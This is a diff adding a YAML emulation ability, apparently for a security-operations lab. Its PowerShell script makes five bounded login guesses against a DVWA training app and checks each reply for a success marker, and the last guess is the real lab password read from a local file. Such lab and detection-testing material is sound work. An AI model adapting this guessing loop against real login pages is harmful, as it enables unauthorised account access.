@@ -1,0 +1,33 @@
+- id: brute-force-bounded-000000000002
+  name: DVWA Bounded Login Brute Force with Per-Attempt Verdict
+  description: >-
+    Performs at most 5 login attempts against the DVWA brute-force module for the lab account: four deliberately wrong values, then the real lab value read from the victim-local login file. Each attempt is verified by the success marker.
+  technique_id: T1110.001
+  technique_name: Password Guessing
+  repeatable: false
+  executors:
+    - name: psh
+      platform: windows
+      command: |
+        $ErrorActionPreference = 'Stop'
+        $base = 'http://192.168.1.150:8080/dvwa'
+        $jar = 'C:\SOC-Lab\WEB\demo\session.txt'
+        $loginData = 'C:\SOC-Lab\config\dvwa_login.json'
+        if (-not (Test-Path $jar)) { Write-Output 'WEB02_BRUTE_ERROR session_missing'; exit 1 }
+        if (-not (Test-Path $loginData)) { Write-Output 'WEB02_BRUTE_ERROR login_file_missing'; exit 1 }
+        $cred = Get-Content -Raw -LiteralPath $loginData | ConvertFrom-Json
+        $bound = 5
+        $results = @()
+        for ($i = 1; $i -le $bound; $i++) {
+          if ($i -lt $bound) { $try = 'deliberately-wrong-' + $i } else { $try = $cred.pwd }
+          $html = (curl.exe -s -b $jar "$base/vulnerabilities/brute/?username=admin&password=$try&Login=Login") -join "`n"
+          $correct = $html.Contains('Welcome to the password protected area')
+          $results += ("ATTEMPT " + $i + " guessed_correctly=" + $correct)
+          if ($correct) { break }
+        }
+        $results | ForEach-Object { Write-Output $_ }
+        $good = ($results | Where-Object { $_ -like '*guessed_correctly=True' }).Count
+        if ($good -ge 1) { Write-Output ("WEB02_BRUTE_OK attempts=" + $results.Count + " hard_bound=" + $bound); exit 0 }
+        Write-Output 'WEB02_BRUTE_VERDICT_NEGATIVE predicate_not_met'
+        exit 1
+      timeout: 90
